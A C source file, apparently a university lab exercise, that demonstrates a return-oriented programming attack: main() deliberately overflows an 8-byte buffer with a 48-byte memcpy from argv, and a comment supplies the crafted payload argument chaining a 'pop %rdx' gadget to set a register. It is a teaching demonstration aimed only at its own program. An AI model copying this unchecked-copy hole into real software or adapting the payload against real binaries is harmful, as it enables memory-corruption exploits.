/**
 * Author: Nalam V S S Krishna Chaitanya,
 * Details: CS13B021, IIT Madras.
 */

#include <stdio.h>
#include <string.h>
#include <stdlib.h>

/**
 * This file demonstrates how to load an arbitrary value into some %rdx
 * register. Since we found out the address of 0xc35a pattern we now use it. Put
 * the value which has to be moved into %rdx register on the stack and use the
 * instruction pop %rdx which moves the value into the register by popping the
 * stack. Since it is followed by a retq instruction it returns to the address
 * on top of stack. In this case we keep a test function to test whether the
 * value has been moved into register or not.
 */

// Gives the value present in the %rdx register as return lies in %rax register.

unsigned long get_rdx()
{
	asm ("movq %rdx,%rax");
}

// The stack should look like this.
//
// |					|<-----Higher Address.
// |					|
// +--------------------+
// | 0x000000000004006a1|<-----Addr of print_rdx
// +--------------------+
// | 0xc0debeef50fa99a9	|<-----Value to be put into %rdx
// +--------------------+
// | 0x00007ffff7ad1ee0 |<-----Address of instruction "pop %rdx"
// +--------------------+
// |<base pointer>		|
// +--------------------+
// |<padding of buffer> |
// +--------------------+
// |<space for buffer>	|
// +--------------------+
// |					|<-----Lower Address.
// |					|

// Argument : "$(python -c 'print "A"*16+"B"*8+"\xe0\x1e\xad\xf7\xff\x7f\x20\x20"+"\xa9\x99\xfa\x50\xef\xbe\xde\xc0"+"\xa1\x06\x40\x20\x20\x20\x20\x20"')"

int main(int argc,char **argv)
{
	char buffer[8];				// Buffer which is overflowed, 8 more bytes are
								// padded.
	memcpy(buffer,argv[1],48);	// Copying the string to buffer.
	memset(buffer+30,0,2);		// restoring NULL bytes.
	memset(buffer+43,0,5);
	asm ("movq $0x5,%rdx");		// Here we move 5 to %rdx but value is chaned
								// using ROP attack.
}

/**
 * prints the value present in %rdx register.
 */

void print_rdx()
{
	printf("rdx is %#lx\n",get_rdx());
	exit(0);
}
